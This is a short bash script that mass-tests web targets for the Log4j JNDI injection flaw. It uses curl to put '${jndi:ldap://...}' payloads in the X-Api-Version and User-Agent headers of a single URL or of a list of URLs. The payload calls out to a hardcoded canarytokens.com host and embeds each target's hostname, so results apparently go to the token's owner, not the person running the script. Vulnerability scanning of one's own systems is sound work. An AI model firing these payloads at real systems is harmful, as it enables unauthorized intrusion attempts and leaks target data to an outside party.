#!/bin/bash 
#Author: Abhijeet Singh (@abhiunix)
#Date: 12 Dec 2021
#Twitter: https://twitter.com/abhiunix

function toolsCheck(){
    if [ -x "$(which httpx)" ] ; then
    	echo ""
    else
        echo "Could not find httpx, please install it from here https://github.com/projectdiscovery/httpx" >&2
        echo "If you are on *nix then run this command: go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
        exit
    fi
}

function functionu(){
echo ""
echo "Checking for log4j vulnerability on $uo"

null=$(curl -sk $uo -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0')
null=$(curl -sk $uo -H 'User-Agent: ${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}')

}

function functionU(){
echo ""
while IFS= read -r line; do
	uo=$line
	functionu
done 
}

if (( $# < 1 )); then
     echo "Try using valid options. Use -h to show help menu."
     exit  
fi
toolsCheck
while getopts u:U:hc options; do
		case $options in
				u) uo=$OPTARG;;
				U) Uo=$OPTARG;;
				h) ho=$OPTARG;;
				p) po=$OPTARG;;
				l) lo=$OPTARG;;
				*) echo "Try using valid options. use -h to show help menu.";;

		esac
		if [[ $options = "u" ]]; then
			functionu
			echo "Payload executed. You will be notified on your email for successful execution."

		elif [[ $options = "U" ]]; then
			echo "Checking if the supplied list of URLs are working fine."
			sleep 3
			cat $2 | httpx | tee $2.urls
			echo ""
			sleep 1
			echo "Nice!! We have collected the working urls in $2.urls file."
			echo ""
			sleep 2
			echo "Now executing log4j payloads on supplied URLs."
			sleep 3
			functionU < $2.urls
			
			echo "Finished the URLs"

		elif [[ $options = "h" ]]; then
			echo "Usage::"
			echo "  -h   Show basic help message and exit"
			echo "  -u   Target URL (e.g. 'http://www.site.com/')"
			echo "  -U   Target URL list file."
			echo ""
			echo "eg: ./log4jTest.sh -u https://example.com"
			echo "eg: ./log4jTest.sh -U ./path/URLlist.txt"
		fi
done
#enhancement
#--cookie support